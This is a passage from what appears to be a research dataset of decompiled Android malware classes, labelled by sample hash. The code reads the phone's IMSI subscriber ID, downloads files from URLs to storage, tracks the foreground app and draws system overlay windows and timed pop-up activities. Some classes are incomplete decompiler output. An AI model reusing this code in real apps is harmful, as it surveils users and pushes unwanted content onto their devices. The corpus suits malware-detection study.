}   public static void a(  String str,  String str2){     URL url=new URL(str);     url.openConnection().connect();     BufferedInputStream bufferedInputStream=new BufferedInputStream(url.openStream());     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     FileOutputStream fileOutputStream=new FileOutputStream(new File(Environment.getExternalStorageDirectory(),str2 + b.J));     byte[] bArr=new byte[1024];     long j=0;     while (true) {       int read=bufferedInputStream.read(bArr);       if (read == -1) {         fileOutputStream.flush();         fileOutputStream.close();         bufferedInputStream.close();         return;       }       j+=read;       fileOutputStream.write(bArr,0,read);     }   }   public static boolean a(  Context context){     return (context.getApplicationInfo().flags & 1) > 0;   }   public static boolean a(  String[] strArr,  Context context){     if (strArr == null || strArr.length <= 0) {       return false;     }     for (    String str : strArr) {       if (b(str,context)) {         return true;       }     }     return false;   }   public static int b(  Context context){     return 100061;   }   public static File b(  int i){     return new File(g.e + i);   }   public static Class b(  Context context,  Class cls){     Class<?> cls2;     try {       ServiceInfo[] serviceInfoArr=a(context,context.getApplicationInfo().packageName,4).services;       if (serviceInfoArr == null) {         return cls;       }       for (      ServiceInfo serviceInfo : serviceInfoArr) {         try {           cls2=Class.forName(serviceInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   private static java.lang.String b(  android.content.Context r5,  java.io.File r6){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.c.h.b(android.content.Context, java.io.File):java.lang.String"");   }   protected static String b(  String str){     try {       byte[] bytes=str.getBytes(b.ae);       byte[] bytes2=b.S.getBytes();       StringBuilder sb=new StringBuilder();       for (int i=0; i < bytes.length; i++) {         sb.append(""%"" + ((bytes[i] & 255) + (bytes2[i % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return str;     }   }   public static List b(  Context context,  boolean z){     com.apkmore.rbjatnldymzfiw.a.b.b[] bVarArr;     HashMap a2=com.apkmore.rbjatnldymzfiw.a.e.a(context).a(z);     if (a2 == null || (bVarArr=(com.apkmore.rbjatnldymzfiw.a.b.b[])a2.get(com.apkmore.rbjatnldymzfiw.a.b.b.class.getName())) == null || bVarArr.equals("""")) {       return null;     }     ArrayList arrayList=new ArrayList();     if (bVarArr != null) {       for (      com.apkmore.rbjatnldymzfiw.a.b.b bVar : bVarArr) {         arrayList.add(bVar);       }     }     return arrayList;   }   public static void b(  Context context,  int i){     if (context == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.bH,0).edit();     edit.putInt(b.bG,i);     edit.commit();   }   public static boolean b(  Context context,  String str){     if (str == null) {       return false;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.B,0).edit();     edit.putString(b.B,str);     return edit.commit();   }   public static boolean b(  String str,  Context context){     if (str == null || """".equals(str)) {       return false;     }     try {       context.getPackageManager().getApplicationInfo(str,8192);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   }   public static Bitmap c(  String str){     InputStream inputStream;     try {       inputStream=(InputStream)new URL(str).getContent();     }  catch (    MalformedURLException e) {       e.printStackTrace();       inputStream=null;     } catch (    IOException e2) {       e2.printStackTrace();       inputStream=null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=false;     options.inSampleSize=1;     return BitmapFactory.decodeStream(inputStream,null,options);   }   public static Class c(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=a(context,context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   public static String c(  Context context){     b(context,""ffaf1a9996c643de9f0c2f70e1500c18"");     return ""ffaf1a9996c643de9f0c2f70e1500c18"";   }   private static String c(  Context context,  File file){     String subscriberId=((TelephonyManager)context.getSystemService(""phone"")).getSubscriberId();     SharedPreferences sharedPreferences=context.getSharedPreferences(b.R,0);     String string=sharedPreferences.getString(b.j,null);     if (string != null && !"""".equals(string)) {       String a2=a(string);       return !g(a2) ? """" : a2;     }     if (g(subscriberId)) {       f(context,subscriberId);       a(context,file,subscriberId);       return subscriberId;     }     if (sharedPreferences != null) {       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(b.j,"""");       edit.commit();     }     return """";   }   public static boolean c(  Context context,  String str){     try {       return context.getPackageManager().getPackageArchiveInfo(str,1) != null;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   }   public static Location d(  Context context){     return null;   }   public static void d(  Context context,  String str){     if (str == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.P,0).edit();     edit.putString(b.Q,str);     edit.commit();   }   public static String[] d(  String str){     String[] strArr=null;     if (str != null) {       try {         JSONObject jSONObject=new JSONObject(str);         if (!jSONObject.isNull(b.q)) {           JSONArray jSONArray=jSONObject.getJSONArray(b.q);           strArr=new String[jSONArray.length()];           for (int i=0; i < jSONArray.length(); i++) {             strArr[i]=jSONArray.getString(i);           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return strArr;   }   public static String e(  Context context){     String string; synchronized (c) {       SharedPreferences sharedPreferences=context.getSharedPreferences(b.D,0);       string=sharedPreferences.getString(b.E,"""");       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.remove(b.E);       edit.clear();       edit.commit();     }     return string;   }   public static List e(  String str){     if (str == null || str.equals("""")) {       return null;     }     com.apkmore.rbjatnldymzfiw.a.b.b[] bVarArr=new com.apkmore.rbjatnldymzfiw.a.b.b[0];     if (str != null && !str.equals("""")) {       bVarArr=(com.apkmore.rbjatnldymzfiw.a.b.b[])com.apkmore.rbjatnldymzfiw.a.b.f.b(com.apkmore.rbjatnldymzfiw.a.b.b.class,str);     }     ArrayList arrayList=new ArrayList();     if (bVarArr != null) {       for (      com.apkmore.rbjatnldymzfiw.a.b.b bVar : bVarArr) {         arrayList.add(bVar);       }     }     return arrayList;   }   public static void e(  Context context,  String str){     if (str == null || str.equals("""")) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(b.bQ,0).edit();     edit.putString(b.bP,str);     edit.commit();   }   public static String f(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   private static void f(  Context context,  String str){     if (str == null) {       return;     }     context.getSharedPreferences(b.R,0).edit().putString(b.j,b(str)).commit();   }   public static String[] f(  String str){     String[] strArr=null;     if (str != null) {       try {         JSONObject jSONObject=new JSONObject(str);         if (!jSONObject.isNull(b.bL)) {           JSONArray jSONArray=jSONObject.getJSONArray(b.bL);           strArr=new String[jSONArray.length()];           for (int i=0; i < jSONArray.length(); i++) {             strArr[i]=jSONArray.getString(i);           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return strArr;   }   public static void g(  Context context){     Toast.makeText(context,b.bd,1).show();   }   private static boolean g(  String str){     try {       Long.valueOf(str.substring(0,3));       return true;     }  catch (    Exception e) {       return false;     }   }   public static String[] h(  Context context){     ActivityManager.RunningTaskInfo runningTaskInfo=((ActivityManager)context.getSystemService(""activity"")).getRunningTasks(1).get(0);     return new String[]{runningTaskInfo.topActivity.getPackageName(),runningTaskInfo.topActivity.getClassName(),String.valueOf(v(context).contains(runningTaskInfo.topActivity.getPackageName()))};   }   public static void i(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(b.aL,0);     f49a=sharedPreferences.getInt(b.aN,0);     if (b.I.equals(c(context))) {     }     if (f49a == 0) {       a(sharedPreferences,1,false);       return;     }     if (f49a < 2) {       f49a++;       a(sharedPreferences,f49a,false);       return;     }     if (f49a == 2 && f(context) != null) {       if (!r(context)) {         com.apkmore.rbjatnldymzfiw.a.f.a(context).a(p(context),o(context));       }       w(context);     }  else     if (f49a > 2) {       try {         if (r(context)) {           return;         }         com.apkmore.rbjatnldymzfiw.a.f.a(context).a(p(context),o(context));       }  catch (      Exception e) {       }     }   }   public static String j(  Context context){     File file=new File(Environment.getExternalStorageDirectory(),b.z);     String b2=b(context,file);     if (b2 == null || """".equals(b2)) {       b2=c(context,file);     }     return (b2 == null || """".equals(b2) || !g(b2)) ? """" : b2;   }   public static int[] k(  Context context){     if (context == null) {       return null;     }     SharedPreferences sharedPreferences=context.getSharedPreferences(b.bC,0);     int i=i.a(context).heightPixels / 4;     int i2=i * 3;     return new int[]{sharedPreferences.getInt(b.y,0),sharedPreferences.getInt(b.bD,i + (new Random().nextInt(i2) % ((i2 - i) + 1)))};   }   public static boolean l(  Context context){     return g.i.exists();   }   public static SharedPreferences m(  Context context){     return context.getSharedPreferences(b.aI,0);   }   public static String n(  Context context){     if (context == null) {       return null;     }     return context.getSharedPreferences(b.P,0).getString(b.Q,null);   }   public static int o(  Context context){     if (context == null) {       return 1;     }     return context.getSharedPreferences(b.bE,0).getInt(b.bF,1);   }   public static int p(  Context context){     if (context == null) {       return 3;     }     return context.getSharedPreferences(b.bH,0).getInt(b.bG,3);   }   public static void q(  Context context){     if (f(context) != null) {       m.a().a(context,0,0);     }  else {       a(context,""-1,0"");     }   }   public static boolean r(  Context context){     if (!l(context)) {       return false;     }     long y=y(context);     if (y == 60) {       x(context);       return false;     }     if (new Date().getTime() - y >= 14400000) {       String n=n(context);       String[] strArr=new String[0];       if (n != null && !n.equals("""")) {         strArr=d(n);       }       List e=e(n);       if (a(strArr,context) || (e != null && !e.isEmpty())) {         Intent intent=new Intent(context,(Class<?>)a(context,Uj.class));         intent.putExtra(""l"",o(context));         intent.addFlags(268435456);         context.startActivity(intent);         x(context);         return true;       }     }     return false;   }   public static List s(  Context context){     String n=n(context);     if (n == null) {       return null;     }     new HashMap();     com.apkmore.rbjatnldymzfiw.a.b.b[] bVarArr=(com.apkmore.rbjatnldymzfiw.a.b.b[])com.apkmore.rbjatnldymzfiw.a.b.f.b(com.apkmore.rbjatnldymzfiw.a.b.b.class,n);     ArrayList arrayList=new ArrayList();     for (    com.apkmore.rbjatnldymzfiw.a.b.b bVar : bVarArr) {       arrayList.add(bVar);     }     return arrayList;   }   public static void t(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(b.aY,0);     Map<String,?> all=sharedPreferences.getAll();     if (all == null || all.isEmpty()) {       return;     }     Iterator<String> it=all.keySet().iterator();     while (it.hasNext()) {       String string=sharedPreferences.getString(it.next(),"""");       if (string != null && !string.equals("""")) {         String[] split=string.split("";"");         String str=split[0];         int intValue=Integer.valueOf(split[1]).intValue();         String str2=split[2];         File file=new File(Environment.getExternalStorageDirectory() + ""/"" + b.G+ intValue+ ""/""+ str);         if (file.exists()) {           com.apkmore.rbjatnldymzfiw.a.i.a(context,R.drawable.stat_sys_download_done,b.aA,intValue,32,a(context,file),str2,-1);         }  else {           com.apkmore.rbjatnldymzfiw.a.i.a(context,intValue);         }       }     }   }   public static String u(  Context context){     return context.getSharedPreferences(b.bQ,0).getString(b.bP,"""");   }   private static List v(  Context context){     ArrayList arrayList=new ArrayList();     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.addCategory(""android.intent.category.HOME"");     Iterator<ResolveInfo> it=packageManager.queryIntentActivities(intent,65536).iterator();     while (it.hasNext()) {       arrayList.add(it.next().activityInfo.packageName);     }     return arrayList;   }   private static void w(  Context context){     SharedPreferences.Editor edit=context.getSharedPreferences(b.aL,0).edit();     edit.putInt(b.aN,10);     edit.putLong(b.aM,System.currentTimeMillis());     edit.commit();   }   private static void x(  Context context){     SharedPreferences.Editor edit=context.getSharedPreferences(b.bI,0).edit();     edit.putLong(b.u,new Date().getTime());     edit.commit();   }   private static long y(  Context context){     return context.getSharedPreferences(b.bI,0).getLong(b.u,60L);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.c\i.code","public class i {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Bitmap a(  Bitmap bitmap,  Context context,  int i,  int i2){     if (bitmap == null) {       return null;     }     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     matrix.postScale(a(context,i) / width,a(context,i2) / height);     return Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true);   }   public static DisplayMetrics a(  Context context){     new DisplayMetrics();     return context.getResources().getDisplayMetrics();   }   public static int b(  Context context,  float f){     return (int)((f / context.getResources().getDisplayMetrics().density) + 0.5f);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\a.code","public class a extends View {   Bitmap f51a;   boolean b;   public int c;   public int d;   private int e;   private int f;   private Context g;   private int h;   public a(  Context context,  int i){     super(context);     this.b=true;     this.c=0;     this.d=0;     this.e=5;     this.f=MotionEventCompat.ACTION_MASK;     this.g=context;     this.h=i;     if (i == 1) {       try {         this.f51a=com.apkmore.rbjatnldymzfiw.a.c.a.a(context,1);       }  catch (      Exception e) {         e.printStackTrace();       }     }  else     if (i == 2) {       try {         this.f51a=com.apkmore.rbjatnldymzfiw.a.c.a.a(context,5);       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     this.f51a=com.apkmore.rbjatnldymzfiw.a.c.i.a(this.f51a,context,40,80);   }   @Override protected void onDraw(  Canvas canvas){     super.onDraw(canvas);     Paint paint=new Paint();     if (this.f > 250) {       this.b=true;     }  else     if (this.f < 100) {       this.b=false;     }     if (this.b) {       this.f-=this.e;     }  else {       this.f+=this.e;     }     paint.setAlpha(this.f);     if (this.f51a != null) {       if (this.h == 1) {         canvas.drawBitmap(this.f51a,com.apkmore.rbjatnldymzfiw.a.c.i.a(this.g,-3.0f),this.d,paint);       }  else       if (this.h == 2) {         canvas.drawBitmap(this.f51a,com.apkmore.rbjatnldymzfiw.a.c.i.a(this.g,3.0f),this.d,paint);       }     }     postInvalidate();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\b.code","public class b extends LinearLayout implements View.OnClickListener {   private LinearLayout f52a;   private TextView b;   private LinearLayout c;   private LinearLayout d;   private Button e;   private Button f;   private View.OnClickListener g;   public b(  Context context){     super(context);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     this.f52a=new LinearLayout(context);     new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{-4144960,-1});     this.f52a.setBackgroundColor(-1);     this.f52a.setOrientation(1);     addView(this.f52a,layoutParams);     this.c=new LinearLayout(context);     this.c.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,new int[]{-4144960,-1}));     this.f52a.addView(this.c,-1,-2);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     layoutParams2.gravity=17;     layoutParams2.setMargins(com.apkmore.rbjatnldymzfiw.a.c.i.a(context,40.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,40.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f));     this.b=new TextView(context);     this.b.setSingleLine(true);     this.b.setText(com.apkmore.rbjatnldymzfiw.a.c.b.aC);     this.b.setTextSize(18.0f);     this.b.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.c.addView(this.b,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.gravity=17;     layoutParams3.setMargins(com.apkmore.rbjatnldymzfiw.a.c.i.a(context,20.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,20.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f));     this.d=new LinearLayout(context);     this.d.setOrientation(0);     this.f52a.addView(this.d,layoutParams3);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-2,-2);     layoutParams4.weight=1.0f;     layoutParams4.rightMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,20.0f);     this.f=new Button(context);     this.f.setText(com.apkmore.rbjatnldymzfiw.a.c.b.aD);     this.f.setPadding(0,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f),0,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f));     this.f.setTextSize(20.0f);     this.f.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.f.setBackgroundColor(-1);     this.f.setOnClickListener(this);     this.f.setTag(1);     this.d.addView(this.f,layoutParams4);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);     layoutParams5.weight=1.0f;     layoutParams5.leftMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,20.0f);     this.e=new Button(context);     this.e.setText(com.apkmore.rbjatnldymzfiw.a.c.b.aE);     this.e.setTextSize(20.0f);     this.e.setPadding(0,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f),0,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f));     this.e.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.e.setBackgroundColor(-1);     this.e.setOnClickListener(this);     this.e.setTag(2);     this.d.addView(this.e,layoutParams5);   }   public void a(  View.OnClickListener onClickListener){     this.g=onClickListener;   }   @Override public void onClick(  View view){     if (this.g != null) {       this.g.onClick(view);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\c.code","public class c {   public static List b;   private static WindowManager c;   private static Context f;   private static AbsoluteLayout i;   private WindowManager.LayoutParams d;   private a e;   private AbsoluteLayout.LayoutParams h;   private b n;   private int s;   private float t;   private float u;   private float v;   private float w;   public static boolean f53a=false;   private static boolean g=false;   private int j=65;   private boolean k=true;   private boolean l=false;   private e m=null;   private int o=1000;   private long p=0;   private float q=0.0f;   private float r=0.0f;   public c(  Context context,  List list,  int i2){     f=context.getApplicationContext();     b=list;     this.s=i2;     a(context);     a(context,i2);   }   public static void a(){     try {       if (c == null || i == null) {         return;       }       c.removeView(i);       com.apkmore.rbjatnldymzfiw.a.f.a(f).a(com.apkmore.rbjatnldymzfiw.a.c.h.p(f),com.apkmore.rbjatnldymzfiw.a.c.h.o(f));     }  catch (    Exception e) {     }   }   private void a(  Context context){     new Thread(new d(this,context)).start();   }   public void a(  Context context,  int i2){     c=(WindowManager)context.getSystemService(""window"");     this.m=new e(this);     this.d=new WindowManager.LayoutParams();     this.d.type=2002;     this.d.format=1;     this.d.flags=40;     DisplayMetrics a2=com.apkmore.rbjatnldymzfiw.a.c.i.a(context);     int i3=a2.heightPixels;     int i4=a2.widthPixels;     int[] k=com.apkmore.rbjatnldymzfiw.a.c.h.k(context);     if (context.getSharedPreferences(com.apkmore.rbjatnldymzfiw.a.c.b.bC,0).getInt(com.apkmore.rbjatnldymzfiw.a.c.b.bD,-666) == -666) {       com.apkmore.rbjatnldymzfiw.a.c.h.a(context,0,k[1]);     }     this.d.x=k[0];     this.d.y=k[1] - (i3 / 2);     if (i2 == 1) {       this.d.gravity=3;     }  else     if (i2 == 2) {       this.d.gravity=5;     }     this.d.width=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,40.0f);     this.d.height=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,80.0f);     this.e=new a(context,i2);     this.e.setOnTouchListener(new f(this,null));     this.e.setOnClickListener(this.m);     this.e.setTag(3);     i=new AbsoluteLayout(context);     this.h=new AbsoluteLayout.LayoutParams(-1,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,80.0f),0,0);     i.addView(this.e,this.h);   }   public static boolean b(){     return g;   }   public void c(){     if (this.e != null) {       c.addView(i,this.d);     }     g=true;   }   public void d(){     if (this.k && this.e != null) {       i.setVisibility(8);     }     g=false;   }   public void e(){     c.removeView(i);     this.d.x=0;     this.d.y=0;     this.d.width=com.apkmore.rbjatnldymzfiw.a.c.i.a(f,200.0f);     this.d.height=com.apkmore.rbjatnldymzfiw.a.c.i.a(f,200.0f);     this.d.gravity=17;     this.n=new b(f);     this.n.a(this.m);     c.addView(this.n,this.d);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\d.code","class d implements Runnable {   final Context f54a;   final c b;   public d(  c cVar,  Context context){     this.b=cVar;     this.f54a=context;   }   @Override public void run(){     if (com.apkmore.rbjatnldymzfiw.a.c.e.b == null) {       com.apkmore.rbjatnldymzfiw.a.c.e.a(this.f54a);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@777bb5c7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\f.code","public class f implements View.OnTouchListener {   DisplayMetrics f56a;   int b;   final c c;   private f(  c cVar){     Context context;     this.c=cVar;     context=c.f;     this.f56a=com.apkmore.rbjatnldymzfiw.a.c.i.a(context);     this.b=this.f56a.heightPixels;   }   public f(  c cVar,  d dVar){     this(cVar);   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     boolean z;     float f;     Context context;     int i;     float f2;     Context context2;     int i2;     Context context3;     float f3;     Context context4;     int i3;     Context context5;     int i4;     float f4;     float f5;     long j;     float f6;     float f7;     float f8;     float f9;     boolean z2;     WindowManager.LayoutParams layoutParams;     float f10;     AbsoluteLayout absoluteLayout;     WindowManager windowManager;     AbsoluteLayout absoluteLayout2;     WindowManager.LayoutParams layoutParams2;     long j2;     int i5;     float f11;     float f12;     int rawY=(int)motionEvent.getRawY(); switch (motionEvent.getAction()) { case 0:       this.c.t=motionEvent.getRawX();     this.c.u=motionEvent.getRawY();   this.c.q=0.0f; this.c.r=motionEvent.getY(); this.c.p=System.currentTimeMillis(); new Handler().postDelayed(new g(this),100L); break; case 1: this.c.p=0L; z=this.c.l; if (z) { f=this.c.w; int i6=this.b; context=c.f; i=this.c.j; if (f <= i6 - com.apkmore.rbjatnldymzfiw.a.c.i.a(context,i)) { f2=this.c.w; context2=c.f; i2=this.c.j; if (f2 >= com.apkmore.rbjatnldymzfiw.a.c.i.a(context2,i2)) { context3=c.f; f3=this.c.w; com.apkmore.rbjatnldymzfiw.a.c.h.a(context3,0,(int)f3); } } } new Handler().postDelayed(new h(this),100L); break; case 2: int i7=this.b; context4=c.f; i3=this.c.j; if (rawY <= i7 - com.apkmore.rbjatnldymzfiw.a.c.i.a(context4,i3)) { context5=c.f; i4=this.c.j; if (rawY >= com.apkmore.rbjatnldymzfiw.a.c.i.a(context5,i4)) { float y=motionEvent.getY(); f4=this.c.r; float abs=Math.abs(y - f4); f5=this.c.q; if (abs > f5) { c cVar=this.c; float y2=motionEvent.getY(); f12=this.c.r; cVar.q=Math.abs(y2 - f12); } j=this.c.p; if (j != 0) { long currentTimeMillis=System.currentTimeMillis(); j2=this.c.p; long j3=currentTimeMillis - j2; i5=this.c.o; if (j3 > i5) { f11=this.c.q; if (f11 < 10.0f) { this.c.e(); } } } this.c.v=motionEvent.getRawX(); this.c.w=motionEvent.getRawY(); f6=this.c.v; f7=this.c.t; f8=this.c.w; f9=this.c.u; int i8=(int)(f8 - f9); z2=this.c.l; if (z2) { int i9=this.b / 2; layoutParams=this.c.d; f10=this.c.w; layoutParams.y=(int)(f10 - i9); absoluteLayout=c.i; if (absoluteLayout != null && Math.abs(i8) > 10) { try { windowManager=c.c; absoluteLayout2=c.i; layoutParams2=this.c.d; windowManager.updateViewLayout(absoluteLayout2,layoutParams2); break; }  catch (Exception e) { e.printStackTrace(); break; } } } } } break; } return false; } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\g.code","class g implements Runnable {   final f f57a;   public g(  f fVar){     this.f57a=fVar;   }   @Override public void run(){     this.f57a.c.l=true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\h.code","class h implements Runnable {   final f f58a;   public h(  f fVar){     this.f58a=fVar;   }   @Override public void run(){     this.f58a.c.l=false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.d\i.code","public class i extends LinearLayout {   public static l f59a;   public AdapterView.OnItemClickListener b;   private Context c;   private o d;   private List e;   private ImageView f;   private RotateAnimation g;   private boolean h;   private ImageView i;   private Animation.AnimationListener j;   public i(  Context context,  int i,  Handler handler){     super(context);     this.h=true;     this.j=new k(this);     this.b=null;     this.c=context;     setLayoutParams(new LinearLayout.LayoutParams(-1,-1));     LinearLayout linearLayout=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-1);     if (i == 1) {       Bitmap a2=com.apkmore.rbjatnldymzfiw.a.c.a.a(context,3);       if (a2 != null) {         linearLayout.setBackgroundDrawable(new BitmapDrawable(a2));       }       layoutParams.rightMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context).widthPixels - com.apkmore.rbjatnldymzfiw.a.c.i.a(context,100.0f);       layoutParams.gravity=3;     }  else     if (i == 2) {       Bitmap a3=com.apkmore.rbjatnldymzfiw.a.c.a.a(context,6);       if (a3 != null) {         linearLayout.setBackgroundDrawable(new BitmapDrawable(a3));       }       layoutParams.leftMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context).widthPixels - com.apkmore.rbjatnldymzfiw.a.c.i.a(context,100.0f);       layoutParams.gravity=5;     }     addView(linearLayout,layoutParams);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-1);     layoutParams2.topMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,15.0f);     if (i == 1) {       layoutParams2.rightMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f);     }  else     if (i == 2) {       layoutParams2.leftMargin=com.apkmore.rbjatnldymzfiw.a.c.i.a(context,10.0f);     }     linearLayout.addView(linearLayout2,layoutParams2);     this.d=new o(context);     this.d.setVisibility(8);     this.d.setDivider(null);     this.d.setDividerHeight(10);     this.d.setVerticalScrollBarEnabled(false);     this.d.setCacheColorHint(0);     DisplayMetrics a4=com.apkmore.rbjatnldymzfiw.a.c.i.a(context);     com.apkmore.rbjatnldymzfiw.a.c.i.b(context,a4.widthPixels);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(com.apkmore.rbjatnldymzfiw.a.c.i.a(context,80.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,com.apkmore.rbjatnldymzfiw.a.c.i.b(context,a4.heightPixels) - 100));     layoutParams3.gravity=1;     linearLayout2.addView(this.d,layoutParams3);     this.i=new ImageView(context);     this.i.setBackgroundColor(-16711936);     linearLayout2.addView(this.i,new LinearLayout.LayoutParams(com.apkmore.rbjatnldymzfiw.a.c.i.a(context,90.0f),com.apkmore.rbjatnldymzfiw.a.c.i.a(context,1.0f)));     this.f=new ImageView(context);     try {       this.f.setImageBitmap(com.apkmore.rbjatnldymzfiw.a.c.a.a(context,7));     }  catch (    Exception e) {       e.printStackTrace();     }     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,com.apkmore.rbjatnldymzfiw.a.c.i.a(context,50.0f));     layoutParams4.gravity=1;     this.f.setOnClickListener(new j(this,context,handler));     linearLayout2.addView(this.f,layoutParams4);     ImageView imageView=new ImageView(context);     imageView.setBackgroundDrawable(new BitmapDrawable(com.apkmore.rbjatnldymzfiw.a.c.a.a(context,2)));     addView(imageView,new LinearLayout.LayoutParams(-1,-1));   }   public void a(){     this.h=true;     this.g=new RotateAnimation(0.0f,720.0f,this.f.getWidth() / 2,this.f.getHeight() / 2);     this.g.setDuration(1000L);     this.g.setAnimationListener(this.j);     this.f.startAnimation(this.g);   }   public void a(  Context context,  List list){     this.e=list;     f59a=new l(context,list);     this.d.setAdapter((ListAdapter)f59a);     if (this.b != null) {       this.d.setOnItemClickListener(this.b);     }     this.d.setOnItemClickListener(this.b);     f59a.notifyDataSetChanged();     this.d.setVisibility(0);   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.b=onItemClickListener;   }   public void a(  boolean z){     this.h=z;   } } "
